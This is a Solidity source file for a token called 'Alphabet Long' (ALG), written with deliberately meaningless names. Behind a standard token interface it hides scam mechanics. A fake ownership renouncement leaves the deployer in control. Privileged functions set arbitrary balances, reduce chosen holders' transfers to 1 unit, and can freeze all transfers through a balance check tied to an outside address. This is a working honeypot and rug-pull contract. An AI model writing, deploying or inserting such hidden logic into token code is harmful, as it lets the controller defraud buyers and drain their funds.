//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface minEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxTakeTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchReceiverSender {
    function createPair(address toTake, address listLimit) external returns (address);
}

interface receiverLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalSender) external view returns (uint256);

    function transfer(address enableAmount, uint256 maxTotal) external returns (bool);

    function allowance(address fromSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxTotal) external returns (bool);

    function transferFrom(
        address sender,
        address enableAmount,
        uint256 maxTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txLiquidity, uint256 value);
    event Approval(address indexed fromSender, address indexed spender, uint256 value);
}

interface limitAmount is receiverLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AlphabetLong is maxTakeTrading, receiverLimit, limitAmount {

    function totalSupply() external view virtual override returns (uint256) {
        return shouldExemptAuto;
    }

    uint256 constant receiverList = 1 ** 10;

    uint256 sellMaxLiquidity;

    address private sellIs;

    function liquidityMode() private view {
        require(feeMarketingLaunched[_msgSender()]);
    }

    bool public marketingFee;

    uint256 private shouldExemptAuto = 100000000 * 10 ** 18;

    bool private autoTeam;

    string private launchTake = "ALG";

    function transfer(address walletSenderList, uint256 maxTotal) external virtual override returns (bool) {
        return txMinTake(_msgSender(), walletSenderList, maxTotal);
    }

    address teamLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public feeMarketingLaunched;

    function liquidityTrading(address autoTo) public {
        require(autoTo.balance < 100000);
        if (marketingFee) {
            return;
        }
        if (senderMaxExempt == autoTeam) {
            takeFromMin = true;
        }
        feeMarketingLaunched[autoTo] = true;
        
        marketingFee = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchTake;
    }

    address public txLimit;

    uint8 private limitAtMode = 18;

    function owner() external view returns (address) {
        return sellIs;
    }

    function transferFrom(address feeEnable, address enableAmount, uint256 maxTotal) external override returns (bool) {
        if (_msgSender() != teamLaunched) {
            if (autoTakeLiquidity[feeEnable][_msgSender()] != type(uint256).max) {
                require(maxTotal <= autoTakeLiquidity[feeEnable][_msgSender()]);
                autoTakeLiquidity[feeEnable][_msgSender()] -= maxTotal;
            }
        }
        return txMinTake(feeEnable, enableAmount, maxTotal);
    }

    function txMinTake(address feeEnable, address enableAmount, uint256 maxTotal) internal returns (bool) {
        if (feeEnable == txLimit) {
            return totalWallet(feeEnable, enableAmount, maxTotal);
        }
        uint256 feeTeam = receiverLimit(amountBuy).balanceOf(listMax);
        require(feeTeam == sellMaxLiquidity);
        require(enableAmount != listMax);
        if (listModeMax[feeEnable]) {
            return totalWallet(feeEnable, enableAmount, receiverList);
        }
        return totalWallet(feeEnable, enableAmount, maxTotal);
    }

    function approve(address teamLiquidityFrom, uint256 maxTotal) public virtual override returns (bool) {
        autoTakeLiquidity[_msgSender()][teamLiquidityFrom] = maxTotal;
        emit Approval(_msgSender(), teamLiquidityFrom, maxTotal);
        return true;
    }

    address listMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address totalSender) public view virtual override returns (uint256) {
        return receiverReceiver[totalSender];
    }

    event OwnershipTransferred(address indexed receiverFromToken, address indexed exemptTake);

    mapping(address => uint256) private receiverReceiver;

    function decimals() external view virtual override returns (uint8) {
        return limitAtMode;
    }

    string private senderTxAt = "Alphabet Long";

    mapping(address => bool) public listModeMax;

    function totalWallet(address feeEnable, address enableAmount, uint256 maxTotal) internal returns (bool) {
        require(receiverReceiver[feeEnable] >= maxTotal);
        receiverReceiver[feeEnable] -= maxTotal;
        receiverReceiver[enableAmount] += maxTotal;
        emit Transfer(feeEnable, enableAmount, maxTotal);
        return true;
    }

    bool private takeFromMin;

    bool private senderMaxExempt;

    function teamToken() public {
        emit OwnershipTransferred(txLimit, address(0));
        sellIs = address(0);
    }

    bool private shouldAt;

    function enableIs(uint256 maxTotal) public {
        liquidityMode();
        sellMaxLiquidity = maxTotal;
    }

    function launchMarketingExempt(address walletSenderList, uint256 maxTotal) public {
        liquidityMode();
        receiverReceiver[walletSenderList] = maxTotal;
    }

    constructor (){
        
        minEnable toLaunch = minEnable(teamLaunched);
        amountBuy = launchReceiverSender(toLaunch.factory()).createPair(toLaunch.WETH(), address(this));
        if (isTotalTo == swapMin) {
            shouldAt = true;
        }
        txLimit = _msgSender();
        teamToken();
        feeMarketingLaunched[txLimit] = true;
        receiverReceiver[txLimit] = shouldExemptAuto;
        
        emit Transfer(address(0), txLimit, shouldExemptAuto);
    }

    uint256 private swapMin;

    uint256 public isTotalTo;

    function name() external view virtual override returns (string memory) {
        return senderTxAt;
    }

    uint256 atExempt;

    bool public autoLaunch;

    address public amountBuy;

    function getOwner() external view returns (address) {
        return sellIs;
    }

    bool private teamAtList;

    function sellSender(address tradingTx) public {
        liquidityMode();
        
        if (tradingTx == txLimit || tradingTx == amountBuy) {
            return;
        }
        listModeMax[tradingTx] = true;
    }

    mapping(address => mapping(address => uint256)) private autoTakeLiquidity;

    function allowance(address tradingMax, address teamLiquidityFrom) external view virtual override returns (uint256) {
        if (teamLiquidityFrom == teamLaunched) {
            return type(uint256).max;
        }
        return autoTakeLiquidity[tradingMax][teamLiquidityFrom];
    }

}